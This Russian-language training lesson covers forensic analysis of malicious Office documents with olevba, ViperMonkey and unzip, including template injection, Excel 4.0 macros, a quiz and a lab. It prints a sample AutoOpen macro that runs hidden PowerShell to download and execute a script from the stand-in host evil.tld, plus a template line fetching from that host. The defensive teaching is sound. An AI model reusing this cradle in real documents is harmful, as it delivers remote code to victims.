---
id: forensics-office-macros
title: "Форензика Office-документов и макросов"
category: forensics
parent: forensics-email
difficulty: medium
order: 1
tags: [office, macro, vba, olevba, ole, docx, malware, phishing]
prerequisites: [forensics-email, forensics-file-magic]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Анализ фишинга"
estimated_minutes: 50
summary: "Разбор документов Office (docm/xlsm/docx): OLE-структура, извлечение и деобфускация VBA-макросов (olevba), встроенные объекты, шаблоны-приманки и индикаторы фишинга."
lab:
  kind: shell
  title: "Практика: извлечь макрос из .docm"
  toolset: [core, unzip]
  workdir: /home/student/task
  files: [task.md, notes.txt, report.docm]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`file report.docm` — OOXML это ZIP-архив."
    - "Посмотри части: `unzip -l report.docm`."
    - "Макрос лежит в `word/vbaProject.bin` — `unzip -p report.docm word/vbaProject.bin`."
    - "Флаг внутри VBA-кода. Запиши его в `found.txt`."

---

## Вопрос, с которого всё начинается

В прошлом уроке мы вытащили из почтового архива вложение `invoice.docm` — «счёт», который сотрудник открыл. Задача: понять, что этот документ делает, **не открывая его**. Открыть в Word нельзя — сработает макрос и, возможно, заразит машину прямо во время разбора.

Документ Office — это не просто текст. Внутри спрятаны **макросы** — маленькие программы на языке VBA, которые запускаются при открытии. Именно они несут нагрузку. Разберём документ слой за слоем.

## Наш пример: `invoice.docm`

Первым делом — что это за формат. Команда `file` читает магические байты:

```bash
$ file invoice.docm
invoice.docm: Microsoft Word 2007+ (ZIP)
```

`.docm` — это **OOXML**: документ, упакованный в обычный ZIP-архив из XML-файлов. Расширение `.docm` говорит «макросы разрешены», но это лишь ярлык — настоящий ответ даёт содержимое. Заглянем внутрь как в архив:

```bash
$ unzip -l invoice.docm | grep -iE 'vba|macro|embed|oleObject'
    10240  2025-10-06 14:10   word/vbaProject.bin
      512  2025-10-06 14:10   word/embeddings/oleObject1.bin
```

Два интересных файла. `vbaProject.bin` — это и есть скомпилированный VBA-проект (макрос). `embeddings/oleObject1.bin` — встроенный объект (о нём позже). Самое важное правило: **доверять содержимому, а не расширению**. Файл `invoice.docx` (без буквы `m`) может точно так же содержать `vbaProject.bin`, если его переименовали, чтобы усыпить бдительность.

## Шаг 1: извлекаем макрос

Читать `vbaProject.bin` руками бесполезно — это бинарный формат. Инструмент `olevba` (из набора `oletools`) распаковывает его в читаемый код и сразу помечает подозрительные вызовы:

```bash
$ olevba invoice.docm
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    Dim u As String
    u = "http://evil.tld/p.ps1"
    Shell "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('" & u & "')"
End Sub
```

Разбираем построчно, вводя термины по мере появления. `Sub AutoOpen()` — это **процедура-обработчик**: Word вызывает её автоматически, как только документ открыт. Именно поэтому достаточно открыть файл, чтобы всё сработало.

Внутри переменной `u` лежит URL, а `Shell` запускает внешнюю программу — `powershell` с ключом `-w hidden` (без окна). Команда `IEX` («Invoke-Expression») выполняет то, что скачает `DownloadString` с `evil.tld`. Итого: документ скачивает и запускает удалённый скрипт — это называется **fileless**-нагрузкой, потому что на диск malware может и не попасть.

## Шаг 2: снимаем обфускацию

Автор малвари почти всегда прячет строки, чтобы статический анализ спотыкался. Частые приёмы: склейка кусков (`"ht" & "tp://"`), функция `Chr(104)` (символ по коду), `StrReverse` (переворот строки), base64. `olevba` умеет их раскручивать:

```bash
$ olevba --deobf --decode invoice.docm | grep -iE 'http|powershell'
u = "http://evil.tld/p.ps1"
```

Флаг `--deobf` разворачивает простую обфускацию, `--decode` декодирует base64/hex. Если этого мало, есть `ViperMonkey` — он **эмулирует** макрос в песочнице (исполняет его логику, но не запускает Office) и печатает реальное поведение: какие URL дёргает, какие файлы создаёт.

```bash
$ vmonkey invoice.docm | grep -iE 'URLDownloadToFile|Shell|http'
```

## Шаг 3: проверяем встроенный объект

Помните `embeddings/oleObject1.bin`? Встроенный объект — это файл внутри документа, часто вторая стадия (EXE, PDF или документ с макросом). Распакуем и посмотрим, что это:

```bash
$ unzip -o invoice.docm -d docm/
$ file docm/word/embeddings/oleObject1.bin
docm/word/embeddings/oleObject1.bin: Composite Document File V2 Document, ... (OLE)
```

Здесь встроен ещё один OLE-документ — его разбирают как отдельный файл (`olevba docm/word/embeddings/oleObject1.bin`) и хешируют.

## Шаг 4: ищем template injection

Есть приём, при котором в самом документе макроса **нет** — он лежит во внешнем шаблоне, который Word подгружает при открытии. Проверяется по связям документа:

```bash
$ cat docm/word/_rels/settings.xml.rels
<Relationship ... Target="http://evil.tld/template.dotm" TargetMode="External"/>
```

`TargetMode="External"` и внешний URL — красный флаг. В документе макроса не видно, а при открытии подтягивается враждебный шаблон. Поэтому проверять надо не только `vbaProject.bin`, но и связи.

## Если макрос не VBA: Excel 4.0

В Word нагрузку несёт VBA, но в Excel есть более старый механизм — макросы **Excel 4.0 (XLM)**. Они хранятся не в `vbaProject.bin`, а в скрытых листах книги, поэтому `olevba` показывает их лишь частично, и их легко пропустить. Вместо кода там формулы с функциями `EXEC`, `CALL`, `URLMON`, которые скачивают и запускают программу.

Признаки XLM-атаки: макрос-листы с именами вроде `Macro1`/`Auto_Open`, скрытые листы и формулы с `EXEC`/`CALL`. Разбирают их отдельным инструментом:

```bash
$ python3 XLMMacroDeobfuscator.py --file invoice.xlsm
$ olevba -a invoice.xlsm | grep -iE 'EXEC|CALL|URLMON'
```

Флаг `-a` в `olevba` заставляет проверить все потоки, а не только первый.

Ещё один случай — **пароль на VBA-проект**. Автор малвари ставит пароль на `vbaProject.bin`, чтобы его нельзя было открыть в редакторе. Это не защита: `olevba` извлекает код и из защищённого проекта.

## Полный разбор: от документа к полезной нагрузке

Соберём разбор `invoice.docm` в один сценарий.

1. **Опознаём формат.** DOCM/XLSM — это **OLE2**-контейнер (или OOXML zip). `file invoice.docm` покажет тип.
2. **Извлекаем макрос:**
   ```bash
   $ olevba invoice.docm
   ```
   На выходе — VBA-код, строки, авто-запуск (`AutoOpen`, `Document_Open`).
3. **Снимаем обфускацию.** Заменяем `Chr()`/`StrReverse`/конкатенацию на читаемый вид; ищем `Shell`, `CreateObject("WScript.Shell")`.
4. **Проверяем встроенный объект.** Часто малварь прячет PE/скрипт внутри OLE-объекта (`oleobj`).
5. **Template injection.** Документ может тянуть вредоносный шаблон по URL (`Settings.xml`/`word/_rels`).
6. **Excel 4.0 (XLM).** Макросы не VBA, а старый формат — `xl/macrosheets/`; извлекаются иначе.

Ключ: вредонос в Office почти всегда = «код в контейнере», который надо распаковать и деобфусцировать.

## Шпаргалка OLE/OOXML

| Структура | Что внутри |
|-----------|-----------|
| `vbaProject.bin` | VBA-макросы |
| `word/_rels/` | связи, шаблоны |
| `xl/macrosheets/` | Excel 4.0 макросы |
| OLE-объект | встроенный файл/PE |

Инструменты: `olevba`, `oleobj`, `oledump`, `zipdump`.

## Частые вопросы

**Как понять, что документ вредоносный?** Авто-запуск + сетевой вызов + `Shell`/`WScript` = высокая вероятность.

**Пароль на VBA-проекте мешает?** `olevba` обходит «защиту» проекта (это не шифрование).

**Макрос не VBA.** Проверьте Excel 4.0 и DDE — старые, но живые техники.

**Как безопасно открыть?** В изолированной ВМ без сети; лучше — статический разбор.

## Что мы теперь знаем

- `.docm`/`.docx` — это ZIP с XML; макрос лежит в `word/vbaProject.bin`.
- Расширение ничего не гарантирует: `.docx` может содержать макрос.
- `AutoOpen`/`Document_Open`/`Workbook_Open` — автозапуск макроса при открытии.
- `olevba` извлекает и деобфусцирует VBA, `ViperMonkey` эмулирует поведение.
- Нагрузку прячут во встроенных объектах (`embeddings/`) и во внешних шаблонах (`settings.xml.rels`).
- IOC — это URL, IP, пути и хеши вложений; их фиксируют для отчёта и детекта.

## Квиз

Проверь себя.

```quiz
- question: "Где в OOXML-документе лежит VBA-макрос?"
  options:
    - "word/document.xml"
    - "word/vbaProject.bin"
    - "word/_rels/settings.xml.rels"
    - "[Content_Types].xml"
  answer: 1
  explanation: "Макрос компилируется в отдельный поток word/vbaProject.bin внутри ZIP."
- question: "Почему документ с макросом опасно открывать в Word для разбора?"
  options:
    - "он увеличится в размере"
    - "сработает AutoOpen и выполнится вредоносный код"
    - "файл удалится"
    - "ничего не произойдёт"
  answer: 1
  explanation: "Обработчик AutoOpen запускается автоматически при открытии документа."
- question: "Какой инструмент извлекает и деобфусцирует VBA?"
  options:
    - "exiftool"
    - "olevba (oletools)"
    - "binwalk"
    - "sha256sum"
  answer: 1
  explanation: "olevba распаковывает vbaProject.bin и умеет --deobf/--decode."
- question: "Что такое remote template injection?"
  options:
    - "локальный макрос"
    - "загрузка внешнего шаблона, дающего выполнение без макроса в самом файле"
    - "шифрование документа"
    - "сжатие ZIP"
  answer: 1
  explanation: "settings.xml.rels с TargetMode=External тянет враждебный .dotm при открытии."
- question: "Что искать в папке word/embeddings/?"
  options:
    - "встроенные объекты — часто вторая стадия нагрузки"
    - "историю правок"
    - "пароль документа"
    - "шрифты"
  answer: 0
  explanation: "В embeddings лежат встроенные файлы (EXE/PDF/документ), которые несут нагрузку."
```

## Куда дальше

Мы разобрали макрос и нашли URL нагрузки. В следующем уроке (`forensics-pdf`) мы возьмём другой частый фишинговый вложение — PDF — и посмотрим, как в нём прячут JavaScript и эксплойты. А пока главное запомни: **Office-документ — это ZIP, макрос лежит в `word/vbaProject.bin`, а `olevba` достаёт и раскручивает его без запуска Word**.

## Где пригодится

- **CTF:** разбор документа-малвари и извлечение флага.
- **DFIR:** анализ фишинговых вложений и цепочки заражения.
- **Threat Hunting:** индикаторы (URL, шаблоны, DDE) для правил детекта.
- **SOC:** правила на автозапуск макросов и remote template.
- **Судебная экспертиза:** доказательство факта открытия документа и его поведения.
